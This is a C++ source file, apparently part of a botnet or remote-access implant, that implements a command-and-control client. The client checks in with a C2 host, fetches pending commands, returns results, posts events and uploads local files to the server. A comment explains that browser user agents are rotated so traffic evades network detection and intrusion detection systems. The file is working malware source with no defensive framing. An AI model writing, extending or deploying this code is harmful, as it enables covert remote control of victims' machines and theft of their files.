/*
MIT License
Copyright (c) 2020 4B4DB4B3
*/

#include "C2Client.h"

// Rotate through realistic Chrome/Edge user agents so every request looks like
// a different browser version. Bare "Mozilla/5.0" is an immediate NDR/IDS flag.
static const char* PickUA() {
    static const char* pool[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.67",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    };
    return pool[rand() % (sizeof(pool) / sizeof(pool[0]))];
}

void C2Client::Checkin(const char* info) {
    std::string path = S("/checkin?id=") + std::to_string(bot_id)
        + S("&auth=") + std::string(auth_key)
        + S("&info=") + std::string(info);
    Requests::GetRequestPinned(c2_host, PickUA(), path.c_str(), c2_host);
}

void C2Client::SendResult(const char* data) {
    std::string path = S("/result?id=") + std::to_string(bot_id)
        + S("&auth=") + std::string(auth_key)
        + S("&data=") + std::string(data);
    Requests::GetRequestPinned(c2_host, PickUA(), path.c_str(), c2_host);
}

std::string C2Client::GetPendingCommand() {
    std::string path = S("/cmd?id=") + std::to_string(bot_id)
        + S("&auth=") + std::string(auth_key);
    return Requests::GetRequestPinned(c2_host, PickUA(), path.c_str(), c2_host);
}

std::string C2Client::UploadFile(const char* localFilePath) {
    std::string path = S("/upload?id=") + std::to_string(bot_id)
        + S("&auth=") + std::string(auth_key);
    return Requests::PostFilePinned(c2_host, PickUA(), path.c_str(), c2_host, localFilePath);
}

void C2Client::SendEvent(const char* json_body) {
    std::string path = S("/event?id=") + std::to_string(bot_id)
        + S("&auth=") + std::string(auth_key);
    Requests::PostJsonPinned(c2_host, PickUA(), path.c_str(), c2_host, json_body);
}
